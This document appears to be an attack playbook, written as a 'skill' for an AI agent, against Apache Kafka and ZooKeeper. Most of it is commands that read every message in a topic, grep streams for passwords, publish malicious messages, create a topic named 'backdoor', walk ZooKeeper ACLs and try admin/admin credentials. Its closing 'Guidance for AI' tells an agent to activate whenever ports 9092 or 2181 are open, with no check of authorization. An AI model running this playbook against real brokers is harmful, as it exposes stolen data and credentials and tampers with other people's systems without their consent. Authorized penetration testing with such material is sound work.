# Apache Kafka Pentesting Skill

## Goal

Identify and exploit vulnerabilities in Apache Kafka message brokers.

## Ports

- **9092** - Kafka Broker (plaintext)
- **9093** - Kafka Broker (SSL)
- **2181** - ZooKeeper

## Methodology

1. **Identify Service:** Scan for Kafka/ZooKeeper ports
2. **Check Authentication:** Test for anonymous access
3. **Enumerate Topics:** List available Kafka topics
4. **Access Messages:** Consume messages from topics
5. **Exploit Access:** Publish messages or attack ZooKeeper

## Enumeration

```bash
# Nmap scan
nmap -sV -p 9092,9093,2181 <target>

# Check Kafka version
kafkacat -b <target>:9092 -L
```

## Topic Enumeration

```bash
# List topics
kafka-topics.sh --bootstrap-server <target>:9092 --list

# Using kafkacat
kafkacat -b <target>:9092 -L

# Describe topic
kafka-topics.sh --bootstrap-server <target>:9092 --describe --topic <topic>
```

## Consuming Messages

```bash
# Consume from beginning
kafka-console-consumer.sh --bootstrap-server <target>:9092 \
  --topic <topic> --from-beginning

# Using kafkacat
kafkacat -b <target>:9092 -t <topic> -C

# Consume with offset
kafkacat -b <target>:9092 -t <topic> -C -o beginning
```

## Producing Messages

```bash
# Publish to topic
echo "malicious message" | kafka-console-producer.sh \
  --bootstrap-server <target>:9092 --topic <topic>

# Using kafkacat
echo "payload" | kafkacat -b <target>:9092 -t <topic> -P
```

## ZooKeeper Exploitation

```bash
# Connect to ZooKeeper
zkCli.sh -server <target>:2181

# List nodes
ls /

# Get Kafka brokers
ls /brokers/ids
get /brokers/ids/0

# Get topics
ls /brokers/topics

# Get ACLs
getAcl /
```

## Consumer Group Enumeration

```bash
# List consumer groups
kafka-consumer-groups.sh --bootstrap-server <target>:9092 --list

# Describe group
kafka-consumer-groups.sh --bootstrap-server <target>:9092 \
  --describe --group <group_name>
```

## Creating Topics

```bash
# Create new topic (if authorized)
kafka-topics.sh --bootstrap-server <target>:9092 \
  --create --topic backdoor --partitions 1 --replication-factor 1
```

## Sensitive Data in Topics

```bash
# Topics that may contain sensitive data
# - credentials, tokens, passwords
# - user_events, auth_logs
# - payment_transactions
# - internal_communications

# Grep for secrets
kafkacat -b <target>:9092 -t <topic> -C | grep -i password
```

## Authentication Bypass

```bash
# If SASL is enabled but misconfigured
# Try without authentication first

# SASL_PLAINTEXT
kafkacat -b <target>:9092 -t <topic> -C \
  -X security.protocol=SASL_PLAINTEXT \
  -X sasl.mechanisms=PLAIN \
  -X sasl.username=admin \
  -X sasl.password=admin
```

## Tools

* **kafkacat/kcat** - Kafka CLI tool
* **kafka-tools** - Apache Kafka scripts
* **zkCli.sh** - ZooKeeper CLI

## Guidance for AI

* Activate when port 9092 or 2181 is open
* No authentication by default in many deployments
* ZooKeeper (2181) often exposed alongside Kafka
* Topics may contain sensitive streaming data
* Check consumer group lag for activity indicators
* ZooKeeper can reveal cluster configuration
